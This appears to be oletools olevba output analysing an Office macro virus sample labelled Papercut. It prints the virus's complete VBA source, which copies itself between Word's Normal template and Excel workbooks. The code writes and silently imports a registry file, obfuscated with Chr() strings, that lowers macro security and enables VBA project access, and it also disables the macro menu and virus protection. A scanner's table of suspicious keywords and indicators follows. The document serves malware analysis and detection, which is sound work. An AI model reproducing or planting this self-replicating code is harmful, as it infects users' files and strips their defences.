olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Papercut
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSOffice.Papercut - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Deactivate()
'
On Error Resume Next
Set a = Application: e = a.Version:
wo = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(87) + Chr(111) + Chr(114) + Chr(107) + Chr(98) + Chr(111) + Chr(111) + Chr(107)
If a = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
p = 0
Set act = ActiveWorkbook.VBProject.VBComponents(wo).CodeModule
Set dis = ThisWorkbook.VBProject.VBComponents(wo).CodeModule
End If
If a <> Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
p = 1
Set act = ActiveDocument.VBProject.VBComponents.Item(p).CodeModule
Set dis = NormalTemplate.VBProject.VBComponents.Item(p).CodeModule
If dis.Lines(2, 1) <> "'" Then
dis.deletelines 1, dis.countoflines
dis.insertlines 1, act.Lines(1, act.countoflines)
dis.Save
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 0 1 1 1 1 0 0 0 0 0 0 0 0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 0 1 1 0 0 0 0 0 0 0 0 0 0 0"

End If
End If
If act.Lines(2, 1) <> "'" Then
act.deletelines 1, act.countoflines
act.insertlines 1, dis.Lines(1, dis.countoflines)
If a = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
ActiveWorkbook.Save
Else
ActiveDocument.SaveAs ActiveDocument.FullName
End If
End If
If a = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
Drop = "true"
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
Set ohio = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
If ohio.Lines(2, 1) <> "'" Then
WordObj.Options.SaveNormalPrompt = False
ohio.deletelines 1, ohio.countoflines
ohio.insertlines 1, dis.Lines(1, dis.countoflines)
ohio.Replaceline 1, "Private Sub Document_Open"
ohio.Save
End If
If crossQuit = True Then WordObj.Quit
End If
End If
If a <> Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
ra = Dir("c:\papercut.reg")
If ra = "" Then Drop = "true"
If Drop <> "true" Then GoTo hd300
Set xlapp = CreateObject("Excel.Application")
Set book1Obj = xlapp.Workbooks.Add
chk = Dir(xlapp.Application.StartupPath & "\Book1.xls")
If chk = "" Then
book1Obj.VBProject.VBComponents.Item(wo).CodeModule.insertlines 1, dis.Lines(1, dis.countoflines)
book1Obj.VBProject.VBComponents.Item(wo).CodeModule.Replaceline 1, "Private Sub Workbook_Deactivate()"
book1Obj.SaveAs xlapp.Application.StartupPath & "\Book1.xls"
book1Obj.Close
Drop = "true"
End If
xlapp.Quit

End If
hd300:
If Drop = "true" Then
Open "c:\base.reg" For Output As 1
Print #1, Chr(82) + Chr(69) + Chr(71) + Chr(69) + Chr(68) + Chr(73) + Chr(84) + Chr(52)
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(56) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(93)
Print #1, """Options6""=dword:00000000"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(57) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """Level""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """Level""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(76) + Chr(79) + Chr(67) + Chr(65) + Chr(76) + Chr(95) + Chr(77) + Chr(65) + Chr(67) + Chr(72) + Chr(73) + Chr(78) + Chr(69) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """AccessVBOM""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """Level""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(76) + Chr(79) + Chr(67) + Chr(65) + Chr(76) + Chr(95) + Chr(77) + Chr(65) + Chr(67) + Chr(72) + Chr(73) + Chr(78) + Chr(69) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """AccessVBOM""=dword:00000001"
Close 1
Shell "regedit /s c:\base.reg", vbHide
End If
'XP/Base
'all your officeXP
'are belong to us
'[aSt]
If p = 1 And e <> "10.0" Then
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = (Rnd * 0)
End If
End Sub



-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: ./Virus.MSOffice.Papercut - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: ./Virus.MSOffice.Papercut - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: ./Virus.MSOffice.Papercut - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: ./Virus.MSOffice.Papercut - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: ./Virus.MSOffice.Papercut - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: ./Virus.MSOffice.Papercut - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - 20, reserved bits not zero: 0x20 visible -        
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |papercut.reg        |Executable file name                         |
|IOC       |base.reg            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

